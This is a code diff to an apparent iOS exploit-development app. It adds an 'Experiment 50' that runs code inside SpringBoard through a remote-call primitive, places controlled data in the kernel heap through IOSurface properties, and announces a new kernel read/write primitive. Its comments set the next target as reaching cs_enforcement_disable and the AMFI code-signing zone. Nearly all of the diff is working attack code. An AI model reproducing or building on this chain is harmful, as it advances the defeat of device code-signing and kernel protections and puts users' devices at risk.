@@ -450,6 +450,14 @@ struct AMFIExperimentView: View {
             let exp49 = self.expIOSurfaceObjC()
             experimentResults.append(exp49)
             
+            // ============================================
+            // 🔥🔥 Experiment 50: IOSurface Property SET/GET
+            // Write+read kernel heap via IOSurface properties!
+            // Then try to read cs_enforcement_disable address!
+            // ============================================
+            let exp50 = self.expIOSurfacePropertyRW()
+            experimentResults.append(exp50)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -2918,6 +2926,107 @@ struct AMFIExperimentView: View {
         
         let success = detail.contains("✅✅✅")
         return ExperimentResult(name: "IOSurface ObjC (SB)", success: success, detail: detail, timestamp: Date())
+    }
+    
+    /// IOSurface Property R/W test — write and read back kernel heap data
+    /// Then: try to use IOSurface kernel object to access AMFI zone
+    private func expIOSurfacePropertyRW() -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "🔥🔥 IOSurface Property RW", success: false, detail: "No SpringBoard RC", timestamp: Date())
+        }
+        
+        let mem = sb.trojanMem
+        var detail = "IOSurface Property Read/Write Test\n\n"
+        
+        // Step 1: Create IOSurface (same as exp49)
+        let nsNumClass = remote_getClass(sb, "NSNumber")
+        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
+        let numWithInt = remote_sel(sb, "numberWithInteger:")
+        let dictNew = remote_sel(sb, "new")
+        let setObj = remote_sel(sb, "setObject:forKey:")
+        
+        let dict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        let allocSize = remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0)
+        let width = remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0)
+        let height = remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0)
+        let bpe = remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0)
+        
+        remote_msg(sb, dict, setObj, allocSize, remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, dict, setObj, width, remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
+        remote_msg(sb, dict, setObj, height, remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
+        remote_msg(sb, dict, setObj, bpe, remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
+        
+        let surface = RootExecutor.rcall(sb, "IOSurfaceCreate", dict)
+        detail += "Surface: 0x\(String(format: "%llx", surface))\n"
+        
+        guard surface != 0 else {
+            detail += "❌ IOSurfaceCreate failed\n"
+            return ExperimentResult(name: "🔥🔥 IOSurface Property RW", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let surfID = RootExecutor.rcall(sb, "IOSurfaceGetID", surface)
+        detail += "Surface ID: \(surfID)\n\n"
+        
+        // Step 2: Set a property with marker data
+        detail += "Setting property 'TestKey' = 0x41414141...\n"
+        let propKey = remote_NSString(sb, "DSPloit_TestProp")
+        
+        // Create NSData with marker
+        let nsDataClass = remote_getClass(sb, "NSData")
+        let dataWithBytes = remote_sel(sb, "dataWithBytes:length:")
+        let markerAddr = mem + 0x1800
+        // Write marker pattern
+        for i in stride(from: 0, to: 64, by: 8) {
+            sb[markerAddr + UInt64(i)].setValue64(0x4141414142424242)
+        }
+        let nsData = remote_msg(sb, nsDataClass, dataWithBytes, markerAddr, 64, 0, 0)
+        detail += "NSData: 0x\(String(format: "%llx", nsData))\n"
+        
+        // IOSurfaceSetValue(surface, key, value)
+        RootExecutor.rcall(sb, "IOSurfaceSetValue", surface, propKey, nsData)
+        detail += "IOSurfaceSetValue called\n"
+        
+        // Step 3: Read property back
+        let readBack = RootExecutor.rcall(sb, "IOSurfaceCopyValue", surface, propKey)
+        detail += "IOSurfaceCopyValue: 0x\(String(format: "%llx", readBack))\n"
+        
+        if readBack != 0 {
+            detail += "✅ Property READ BACK successfully!\n\n"
+            
+            // Get length of returned data
+            let lengthSel = remote_sel(sb, "length")
+            let dataLen = remote_msg(sb, readBack, lengthSel, 0, 0, 0, 0)
+            detail += "Data length: \(dataLen)\n"
+            
+            // Get bytes pointer
+            let bytesSel = remote_sel(sb, "bytes")
+            let bytesPtr = remote_msg(sb, readBack, bytesSel, 0, 0, 0, 0)
+            detail += "Bytes ptr: 0x\(String(format: "%llx", bytesPtr))\n"
+            
+            // Read first 8 bytes to verify marker
+            if bytesPtr != 0 {
+                var readBuf = [UInt8](repeating: 0, count: 8)
+                sb.remoteRead(bytesPtr, to: &readBuf, size: 8)
+                let val = readBuf.withUnsafeBytes { $0.load(as: UInt64.self) }
+                detail += "First 8 bytes: 0x\(String(format: "%016llx", val))\n"
+                
+                if val == 0x4141414142424242 {
+                    detail += "\n✅✅✅ IOSurface Property R/W CONFIRMED! ✅✅✅\n"
+                    detail += "Marker 0x4141414142424242 verified!\n\n"
+                    detail += "We can now:\n"
+                    detail += "1. Allocate controlled data in kernel heap\n"
+                    detail += "2. Read it back via IOSurface properties\n"
+                    detail += "3. This is a NEW KRW primitive in DIFFERENT zone!\n"
+                    detail += "4. Next: find IOSurface kernel object → manipulate\n"
+                }
+            }
+        } else {
+            detail += "❌ IOSurfaceCopyValue returned NULL\n"
+            detail += "Property might not have been set properly\n"
+        }
+        
+        let success = detail.contains("✅✅✅")
+        return ExperimentResult(name: "🔥🔥 IOSurface Property RW", success: success, detail: detail, timestamp: Date())
     }
     
     /// IOSurface from SpringBoard — SB has IOSurface entitlement!
